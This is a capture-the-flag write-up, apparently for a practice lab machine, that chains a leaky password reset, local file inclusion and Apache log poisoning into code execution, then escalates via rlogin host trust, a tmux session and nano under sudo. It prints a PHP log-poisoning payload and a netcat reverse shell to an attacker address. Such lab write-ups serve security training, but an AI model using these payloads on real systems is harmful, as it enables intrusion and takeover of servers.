# Reset Writeup

## 1. Enumeration

### Nmap Scan

```bash
sudo nmap -p- -sC -sV --min-rate 1000 10.129.3.115
```

**Explanation**

- `-p-` scans all 65535 ports
- `-sC` runs default NSE scripts
- `-sV` detects service versions
- `--min-rate 1000` speeds up the scan by sending packets faster

The scan revealed **five open TCP ports**, including an HTTP service.

Accessing the web service in a browser revealed an **admin login page**.

---

## 2. Initial Access (User Flag)

### Password Reset Function

The application contains a **"Forgot Password"** feature that allows users to reset their password.

Testing different usernames revealed the following behavior:

- `user` → username not found  
- `admin` → password reset successful  

Using the browser's **Developer Tools**, the response body revealed a field containing the **new password**.

After logging in as **admin**, the dashboard displayed the contents of a **log file**.

---

### Identifying Local File Inclusion (LFI)

Using Burp Suite, the request on the admin dashboard revealed a parameter:

```
file=
```

This parameter determines which file is displayed.

From the earlier Nmap scan we already know the web server is **Apache**.

Searching for the default Apache log location revealed:

```
/var/log/apache2/access.log
```

By setting the parameter to:

```
file=/var/log/apache2/access.log
```

the contents of the **access log** were displayed.

This confirmed that the application was vulnerable to **Local File Inclusion (LFI)**.

**Local File Inclusion (LFI)** is a vulnerability where an attacker manipulates input parameters to force an application to include files stored on the server.

---

## Log Poisoning → Remote Code Execution

The Apache access log records request headers such as:

```
User-Agent
```

Since we can both:

- read the log file  
- inject data into the log file  

this suggests the possibility of **log poisoning**.

### Conditions for Log Poisoning → RCE

1. The application has a **Local File Inclusion (LFI)** vulnerability.
2. The attacker can read a log file (e.g., Apache `access.log`) via LFI.
3. User-controlled input (e.g., `User-Agent`) is written into the log file.
4. The log file is included by the application in a way that executes PHP code.

Conditions **1–3 were confirmed**, so the next step was to test condition **4**.

---

### Testing Code Execution

A PHP payload was injected into the `User-Agent` header:

```
<?php system('id'); ?>
```

Request steps:

1. Send request with malicious `User-Agent`
2. Load the log file using LFI

```
file=/var/log/apache2/access.log
```

The response displayed the output of the `id` command, confirming **remote code execution**.

---

### Reverse Shell

A reverse shell payload was injected into the log file:

```
<?php exec('busybox nc 10.10.15.56 1234 -e bash'); ?>
```

Start a listener on the attacker machine:

```bash
nc -nlvp 1234
```

**Explanation**

- `-n` disables DNS resolution  
- `-l` starts listening mode  
- `-v` enables verbose output  
- `-p` specifies the listening port  

After including the poisoned log file again:

```
file=/var/log/apache2/access.log
```

a reverse shell connection was established.

The **user flag** was found at:

```
/home/sadm/user.txt
```

---

## 3. Privilege Escalation

### Investigating rlogin Trust Relationship

The file:

```
/etc/hosts.equiv
```

was discovered on the system.

This file defines **trusted hosts** for remote login services such as `rlogin`.

If a trusted host connects using `rlogin`, the system may allow login **without requiring a password**.

The file revealed that the user **sadm** was trusted.

---

### Exploiting the Trust Relationship

A local user named `sadm` was created on the attack machine.

```bash
sudo useradd sadm
```

Creates a new user.

```bash
sudo passwd sadm
```

Sets the user's password.

Switch to the new user:

```bash
sudo su sadm
```

Then connect using:

```bash
rlogin 10.129.3.115
```

This successfully provided a shell as **sadm**.

---

### Discovering a Tmux Session

Check running processes:

```bash
ps aux | grep sadm
```

**Explanation**

- `ps aux` lists all running processes  
- `grep sadm` filters processes related to the user `sadm`  

The output showed an active **tmux session**.

Tmux allows multiple terminal sessions within a single terminal.

Attach to the existing session:

```bash
tmux attach -t sadm_session
```

This revealed the output of:

```
sudo -l
```

The user `sadm` could run:

```
sudo nano /etc/firewall.sh
```

---

### Exploiting Nano

Open the file:

```bash
sudo nano /etc/firewall.sh
```

Inside **nano**, pressing:

```
CTRL + R
CTRL + X
```

opens the **execute command** prompt.

From there, a command can be executed as root:

```
cat /root/root*.txt
```

Root flag obtained.

---

## What We Learned

- How **Local File Inclusion (LFI)** can lead to **Remote Code Execution**
- How **log poisoning** works through web server logs
- How to exploit **trusted host relationships** in `/etc/hosts.equiv`
- How exposed **tmux sessions** can lead to privilege escalation
- How to execute commands from within **nano**
